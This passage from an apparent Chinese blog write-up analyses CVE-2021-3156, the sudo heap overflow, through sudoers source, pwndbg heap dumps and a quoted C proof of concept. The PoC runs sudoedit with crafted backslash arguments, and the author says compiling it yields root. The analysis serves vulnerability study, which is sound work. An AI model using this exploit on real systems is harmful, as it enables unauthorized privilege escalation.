class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* set user_args */</span></span><br><span class="line"><span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> *to, *from, **av;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>, n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">size</span> = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line"><span class="built_in">size</span> += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(<span class="built_in">size</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*//检查是否开启 MODE_SHELL或MODE_LOGIN_SHELL</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; *av; av++) &#123;</span><br><span class="line">    n = strlcpy(to, *av, <span class="built_in">size</span> - (to - user_args));</span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="built_in">size</span> - (to - user_args)) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"internal error, %s overflow"</span>), __func__);</span><br><span class="line">debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    to += n;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先看NewArgv</p><p><img src="/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210412180614988-1618586880599.png" alt="image-20210412180614988"></p><p>可以看到我们的参数，观察函数调用栈，<code>sudoers_policy_main</code>里面定义了NewArgv</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Make a local copy of argc/argv, with special handling</span></span><br><span class="line"><span class="comment">    * for pseudo-commands and the '-i' option.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">if</span> (argc == <span class="number">0</span>) &#123;</span><br><span class="line">NewArgc = <span class="number">1</span>;</span><br><span class="line">   <span class="comment">//分配堆数组</span></span><br><span class="line">NewArgv = reallocarray(<span class="literal">NULL</span>, NewArgc + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="keyword">if</span> (NewArgv == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">NewArgv[<span class="number">0</span>] = user_cmnd;</span><br><span class="line">NewArgv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Must leave an extra slot before NewArgv for bash's --login */</span></span><br><span class="line">NewArgc = argc;</span><br><span class="line">NewArgv = reallocarray(<span class="literal">NULL</span>, NewArgc + <span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="keyword">if</span> (NewArgv == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(++NewArgv, argv, argc * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">NewArgv[NewArgc] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_LOGIN_SHELL) &amp;&amp; runas_pw != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    NewArgv[<span class="number">0</span>] = strdup(runas_pw-&gt;pw_shell);</span><br><span class="line">    <span class="keyword">if</span> (NewArgv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line"><span class="built_in">free</span>(NewArgv);</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>继续看上面的,size为2+28+1=31</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">for</span> (<span class="built_in">size</span> = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line"><span class="built_in">size</span> += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>看漏洞点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><p>这里直接下断点,看to中的内容</p><p>造成了堆溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>s <span class="number">0x555555786650</span></span><br><span class="line"><span class="number">0x555555786650</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x555555786651</span>:<span class="string">"aabbccddeeffgghhiiggkkllmmnn aabbccddeeffgghhiiggkkllmmnn \367\377\177"</span></span><br><span class="line"><span class="number">0x55555578668f</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x555555786690</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x555555786691</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x555555786692</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x555555786693</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x555555786694</span>:<span class="string">""</span></span><br><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x555555786650</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555786640</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>==&gt;chunk <span class="built_in">size</span></span><br><span class="line"><span class="number">0x555555786650</span>:<span class="number">0x6463636262616100</span><span class="number">0x6867676666656564</span></span><br><span class="line"><span class="number">0x555555786660</span>:<span class="number">0x6c6b6b6767696968</span><span class="number">0x6161206e6e6d6d6c</span></span><br><span class="line">    </span><br><span class="line"><span class="number">0x555555786670</span>:<span class="number">0x6565646463636262</span><span class="number">0x6969686867676666</span>  ==&gt;chunk <span class="built_in">size</span>  </span><br><span class="line"><span class="number">0x555555786680</span>:<span class="number">0x6d6d6c6c6b6b6767</span><span class="number">0x00007ffff7206e6e</span></span><br><span class="line"><span class="number">0x555555786690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557866a0</span>:<span class="number">0x7420656c69662073</span><span class="number">0x656c62616e65206f</span></span><br><span class="line"><span class="number">0x5555557866b0</span>:<span class="number">0x7369687420230a20</span><span class="number">0x6f6974636e756620</span></span><br><span class="line"><span class="number">0x5555557866c0</span>:<span class="number">0x66207974696c616e</span><span class="number">0x747369786520726f</span></span><br><span class="line"><span class="number">0x5555557866d0</span>:<span class="number">0x74736e6920676e69</span><span class="number">0x6e6f6974616c6c61</span></span><br><span class="line"><span class="number">0x5555557866e0</span>:<span class="number">0x756f792066692073</span><span class="number">0x230a216873697720</span></span><br><span class="line"><span class="number">0x5555557866f0</span>:<span class="number">0x6c616e694620230a</span><span class="number">0x61656c70202c796c</span></span><br><span class="line"><span class="number">0x555555786700</span>:<span class="number">0x2065746f6e206573</span><span class="number">0x6973752074616874</span></span><br><span class="line"><span class="number">0x555555786710</span>:<span class="number">0x762065687420676e</span><span class="number">0x6f63206f64757369</span></span><br><span class="line"><span class="number">0x555555786720</span>:<span class="number">0x736920646e616d6d</span><span class="number">0x6365722065687420</span></span><br><span class="line"><span class="number">0x555555786730</span>:<span class="number">0x6465646e656d6d6f</span><span class="number">0x7420230a79617720</span></span><br><span class="line"><span class="comment">//观察堆布局</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555786640</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: <span class="number">0x555555786670</span></span><br><span class="line">Size: <span class="number">0x6969686867676666</span></span><br><span class="line">fd: <span class="number">0x6d6d6c6c6b6b6767</span></span><br><span class="line">bk: <span class="number">0x7ffff7206e6e</span></span><br></pre></td></tr></table></figure><blockquote><p>那么为什么会出现这样的情况?</p><p>本意:aabbccddeeffgghhiiggkkllmmnn</p><p>实际:aabbccddeeffgghhiiggkkllmmnn()aabbccddeeffggiiggkkllmmnn()</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">            <span class="comment">//to是刚分配的地方 NewArgv[0]=sudoedit *av=\\x00 NewArgv[2]="aabbccddeeffgghhiiggkkllmmnn"</span></span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">                <span class="comment">//若from[0]为\并且from[1]不是空白，则from++</span></span><br><span class="line">    from++;<span class="comment">//from++指向了\x00</span></span><br><span class="line">*to++ = *from++;<span class="comment">//from++指向了下一个字符串，之后不会进入if语句</span></span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//标准的空白字符包括：</span></span><br><span class="line"><span class="string">' '</span>     (<span class="number">0x20</span>)    space (SPC) 空格符</span><br><span class="line">'\t'    (0x09)    horizontal tab (TAB) 水平制表符    </span><br><span class="line"><span class="string">'\n'</span>    (<span class="number">0x0a</span>)    newline (LF) 换行符</span><br><span class="line">'\v'    (0x0b)    vertical tab (VT) 垂直制表符</span><br><span class="line"><span class="string">'\f'</span>    (<span class="number">0x0c</span>)    feed (FF) 换页符</span><br><span class="line">'\r'    (0x0d)    carriage return (CR) 回车符</span><br><span class="line">函数原型：<span class="function"><span class="keyword">int</span> <span class="title">isspace</span><span class="params">(<span class="keyword">int</span> c)</span></span>;</span><br><span class="line">返回值：如果 c 是一个空白字符，则该函数返回非零值（<span class="literal">true</span>），否则返回 <span class="number">0</span>（<span class="literal">false</span>）。</span><br></pre></td></tr></table></figure><p>循环之前</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>g to<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555557865f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555786600</span>:<span class="number">0x00007ffff79b5ca0</span><span class="number">0x00007ffff79b5ca0</span></span><br><span class="line"><span class="number">0x555555786610</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555786620</span>:<span class="number">0x2065766f62612065</span><span class="number">0x0000000000000d91</span></span><br><span class="line"><span class="number">0x555555786630</span>:<span class="number">0x00007ffff79b5ca0</span><span class="number">0x00007ffff79b5ca0</span></span><br><span class="line"><span class="number">0x555555786640</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555786650</span>:<span class="number">0x7420656c69662073</span><span class="number">0x656c62616e65206f</span></span><br><span class="line"><span class="number">0x555555786660</span>:<span class="number">0x7369687420230a20</span><span class="number">0x6f6974636e756620</span></span><br></pre></td></tr></table></figure><p>for外层循环一次，其实已经复制完成了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx to<span class="number">-0x2d</span></span><br><span class="line"><span class="number">0x5555557865f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555786600</span>:<span class="number">0x6463636262616100</span><span class="number">0x6867676666656564</span></span><br><span class="line"><span class="number">0x555555786610</span>:<span class="number">0x6c6b6b6767696968</span><span class="number">0x0000006e6e6d6d6c</span></span><br><span class="line"><span class="number">0x555555786620</span>:<span class="number">0x2065766f62612065</span><span class="number">0x0000000000000d91</span></span><br><span class="line"><span class="number">0x555555786630</span>:<span class="number">0x00007ffff79b5ca0</span><span class="number">0x00007ffff79b5ca0</span></span><br><span class="line"><span class="number">0x555555786640</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555786650</span>:<span class="number">0x7420656c69662073</span><span class="number">0x656c62616e65206f</span></span><br><span class="line"><span class="number">0x555555786660</span>:<span class="number">0x7369687420230a20</span><span class="number">0x6f6974636e756620</span></span><br></pre></td></tr></table></figure><p>由于*av!=NULL，所以循环两次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx to<span class="number">-0x4a</span></span><br><span class="line"><span class="number">0x5555557865f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555786600</span>:<span class="number">0x6463636262616100</span><span class="number">0x6867676666656564</span></span><br><span class="line"><span class="number">0x555555786610</span>:<span class="number">0x6c6b6b6767696968</span><span class="number">0x6161206e6e6d6d6c</span></span><br><span class="line"><span class="number">0x555555786620</span>:<span class="number">0x6565646463636262</span><span class="number">0x6969686867676666</span></span><br><span class="line"><span class="number">0x555555786630</span>:<span class="number">0x6d6d6c6c6b6b6767</span><span class="number">0x00007ffff79b6e6e</span></span><br><span class="line"><span class="number">0x555555786640</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555786650</span>:<span class="number">0x7420656c69662073</span><span class="number">0x656c62616e65206f</span></span><br><span class="line"><span class="number">0x555555786660</span>:<span class="number">0x7369687420230a20</span><span class="number">0x6f6974636e756620</span></span><br></pre></td></tr></table></figure><blockquote><p>多次调试，偏移可能不太对</p></blockquote><p>ok,堆溢出分析完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x555555786650</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555786640</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>==&gt;chunk <span class="built_in">size</span></span><br><span class="line"><span class="number">0x555555786650</span>:<span class="number">0x6463636262616100</span><span class="number">0x6867676666656564</span></span><br><span class="line"><span class="number">0x555555786660</span>:<span class="number">0x6c6b6b6767696968</span><span class="number">0x6161206e6e6d6d6c</span></span><br><span class="line">    </span><br><span class="line"><span class="number">0x555555786670</span>:<span class="number">0x6565646463636262</span><span class="number">0x6969686867676666</span>  ==&gt;chunk <span class="built_in">size</span>  </span><br><span class="line"><span class="number">0x555555786680</span>:<span class="number">0x6d6d6c6c6b6b6767</span><span class="number">0x00007ffff7206e6e</span></span><br><span class="line"><span class="number">0x555555786690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557866a0</span>:<span class="number">0x7420656c69662073</span><span class="number">0x656c62616e65206f</span></span><br><span class="line"><span class="number">0x5555557866b0</span>:<span class="number">0x7369687420230a20</span><span class="number">0x6f6974636e756620</span></span><br><span class="line"><span class="number">0x5555557866c0</span>:<span class="number">0x66207974696c616e</span><span class="number">0x747369786520726f</span></span><br><span class="line"><span class="number">0x5555557866d0</span>:<span class="number">0x74736e6920676e69</span><span class="number">0x6e6f6974616c6c61</span></span><br><span class="line"><span class="number">0x5555557866e0</span>:<span class="number">0x756f792066692073</span><span class="number">0x230a216873697720</span></span><br><span class="line"><span class="number">0x5555557866f0</span>:<span class="number">0x6c616e694620230a</span><span class="number">0x61656c70202c796c</span></span><br><span class="line"><span class="number">0x555555786700</span>:<span class="number">0x2065746f6e206573</span><span class="number">0x6973752074616874</span></span><br><span class="line"><span class="number">0x555555786710</span>:<span class="number">0x762065687420676e</span><span class="number">0x6f63206f64757369</span></span><br><span class="line"><span class="number">0x555555786720</span>:<span class="number">0x736920646e616d6d</span><span class="number">0x6365722065687420</span></span><br><span class="line"><span class="number">0x555555786730</span>:<span class="number">0x6465646e656d6d6f</span><span class="number">0x7420230a79617720</span></span><br><span class="line"><span class="comment">//观察堆布局</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555786640</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: <span class="number">0x555555786670</span></span><br><span class="line">Size: <span class="number">0x6969686867676666</span></span><br><span class="line">fd: <span class="number">0x6d6d6c6c6b6b6767</span></span><br><span class="line">bk: <span class="number">0x7ffff7206e6e</span></span><br></pre></td></tr></table></figure><h1 id="0x07-POC分析"><a href="#0x07-POC分析" class="headerlink" title="0x07 POC分析"></a>0x07 POC分析</h1><p><a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/blasty/CVE-2021-3156</a></p><h2 id="1-分析poc"><a href="#1-分析poc" class="headerlink" title="1. 分析poc"></a>1. 分析poc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *sh=<span class="string">"/usr/bin/sudoedit"</span>;</span><br><span class="line">    <span class="keyword">char</span>* argv[]=&#123;<span class="string">"sudoedit"</span>,<span class="string">"-s"</span>,</span><br><span class="line">                <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* envp[]=&#123;<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,</span><br><span class="line">                <span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"\\"</span>,<span class="string">"X/P0P_SH3LLZ_"</span>, <span class="string">"LC_ALL=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>,<span class="literal">NULL</span></span><br><span class="line">                &#125;;</span><br><span class="line">    execve(sh,argv,envp);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    printf("[+] bl1ng bl1ng! We got it!\n");</span></span><br><span class="line"><span class="comment">    setuid(0); seteuid(0); setgid(0); setegid(0);</span></span><br><span class="line"><span class="comment">    static char *a_argv[] = &#123; "sh", NULL &#125;;</span></span><br><span class="line"><span class="comment">    static char *a_envp[] = &#123; "PATH=/bin:/usr/bin:/sbin", NULL &#125;;</span></span><br><span class="line"><span class="comment">    execv("/bin/sh", a_argv);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接替换<code>hax.c</code>然后gcc即可提权</p><p>分析一下</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="function"><span class="keyword">int</span> <span class="title">execve</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv [], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure><p>简单说一下，在代码中首先定义了：char <em>sh、char</em> argv[]、char* 